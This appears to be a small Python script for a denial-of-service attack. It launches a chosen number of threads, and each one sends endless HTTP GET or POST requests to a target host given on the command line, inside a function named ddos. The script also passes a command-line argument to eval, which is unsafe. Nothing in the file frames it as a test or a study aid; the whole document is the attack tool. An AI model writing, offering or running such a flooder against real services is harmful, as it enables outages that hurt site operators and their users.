import sys
import requests
import json
from threading import Thread

host = sys.argv[1]
print(host)
port = int(sys.argv[2])
threads = int(sys.argv[3])
data_exists = False
if len(sys.argv) > 4:
    data = eval(sys.argv[4])
    data_exists = True


def ddos():
    try:
        while True:
            if data_exists:
                headers = {'content-type': 'application/json'}
                r = requests.post(headers=headers, url=host, json=data)
            else:
                r = requests.get(url=host)
            print(r.text)
    except KeyboardInterrupt:
        print("stopped on Keyboard Interrupt")
        pass


for i in range(threads):
    t = Thread(target=ddos)
    t.start()
